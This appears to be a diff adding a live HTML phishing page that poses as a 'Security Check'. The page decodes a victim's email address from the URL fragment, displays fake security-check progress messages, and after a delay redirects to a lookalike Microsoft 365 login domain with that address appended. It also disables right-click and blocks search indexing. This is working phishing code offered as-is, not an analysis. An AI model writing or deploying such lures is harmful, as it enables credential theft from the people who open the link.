@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
+    <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload">
+    <meta http-equiv="Referrer-Policy" content="no-referrer">
+    
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            position: relative;
+        }
+        .image-container {
+            width: 100%;
+            max-width: 900px;
+        }
+        .image-container img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        .security-check, #loadingMessage {
+            display: none;
+            margin-top: 1rem;
+            font-size: 1rem;
+            color: #4CAF50;
+            background-color: #f2f2f2;
+            padding: 10px 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            text-align: center;
+        }
+        #email {
+            display: none;
+            margin-top: 1rem;
+        }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+    <div class="container">
+        <div class="image-container">
+            <img src="https://pbs.twimg.com/media/GGrR89_WgAAgrOI?format=jpg&name=large" alt="Simulating Disconnection...">
+        </div>
+        <input type="text" id="email" placeholder="Email will be populated here">
+        <p class="security-check" id="securityCheckMessage">Security check completed successfully!</p>
+        <p id="loadingMessage">Please wait while we check your security...</p>
+    </div>
+
+    <script>
+        (function() {
+            'use strict';
+
+            function getEmailFromHash() {
+                const hash = window.location.hash.substr(1);
+                try {
+                    return atob(hash);
+                } catch (error) {
+                    console.error("Failed to extract email from hash:", error);
+                    return null;
+                }
+            }
+
+            function populateEmail() {
+                const email = getEmailFromHash();
+                const emailField = document.getElementById("email");
+                emailField.value = email || 'Invalid email';
+                emailField.style.display = 'block';
+            }
+
+            function simulateDisconnection() {
+                document.getElementById("loadingMessage").style.display = 'block';
+
+                setTimeout(() => {
+                    document.getElementById("loadingMessage").style.display = 'none';
+                    document.querySelector('.security-check').style.display = 'block';
+
+                    setTimeout(() => {
+                        const redirectTo = "https://l0g1n-micros.robedemariee.net/o365" + window.location.hash.substr(1);
+                        window.location.href = redirectTo;
+                    }, 6000);
+                }, 10000);
+            }
+
+            window.onload = function() {
+                simulateDisconnection();
+                setTimeout(populateEmail, 10000);
+            };
+        })();
+    </script>
+</body>
+</html>
